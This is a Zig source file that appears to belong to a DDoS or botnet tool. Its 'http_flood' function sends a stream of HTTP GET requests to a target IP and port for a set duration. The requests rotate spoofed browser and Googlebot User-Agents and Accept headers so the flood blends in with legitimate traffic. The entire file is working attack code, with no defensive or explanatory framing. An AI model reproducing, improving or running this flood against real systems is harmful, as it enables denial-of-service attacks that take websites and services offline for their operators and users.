const std = @import("std");

const helpers = @import("../helpers.zig");
const Caller = @import("Caller.zig");

const linux = std.os.linux;

const USER_AGENTS = [_][]const u8{
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
};

const ACCEPT_HEADERS = [_][]const u8{
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "*/*",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
};

pub fn http_flood(allocator: std.mem.Allocator, dst_ip: [4]u8, port: u16, duration: u32) void {
    const c = Caller.init(allocator, 5, duration, @constCast(&_http), .{ .ip = dst_ip, .port = port });
    c.call();
}

fn _http(dst_ip: [4]u8, port: u16) void {
    const fd = linux.socket(linux.AF.INET, linux.SOCK.STREAM, 0);
    defer _ = linux.close(@intCast(fd));

    const sockaddr = std.net.Address{ .in = std.net.Ip4Address.init(dst_ip, port) };

    helpers.connect(@intCast(fd), &sockaddr.any, @sizeOf(linux.sockaddr)) catch return;

    const ua = USER_AGENTS[helpers.randomInt(usize, 0, USER_AGENTS.len - 1)];
    const accept = ACCEPT_HEADERS[helpers.randomInt(usize, 0, ACCEPT_HEADERS.len - 1)];

    // build IP string for Host header
    var ip_buf: [15]u8 = undefined;
    const ip_str = std.fmt.bufPrint(&ip_buf, "{d}.{d}.{d}.{d}", .{ dst_ip[0], dst_ip[1], dst_ip[2], dst_ip[3] }) catch return;

    var req_buf: [1024]u8 = undefined;
    const request = std.fmt.bufPrint(&req_buf,
        "GET / HTTP/1.1\r\n" ++
            "Host: {s}\r\n" ++
            "User-Agent: {s}\r\n" ++
            "Accept: {s}\r\n" ++
            "Accept-Language: en-US,en;q=0.9\r\n" ++
            "Accept-Encoding: gzip, deflate\r\n" ++
            "Connection: keep-alive\r\n" ++
            "Cache-Control: no-cache\r\n" ++
            "\r\n",
        .{ ip_str, ua, accept },
    ) catch return;

    _ = helpers.sendto(@intCast(fd), request.ptr, request.len, linux.MSG.NOSIGNAL, &sockaddr.any, @intCast(@as(linux.socklen_t, sockaddr.getOsSockLen()))) catch return;
}
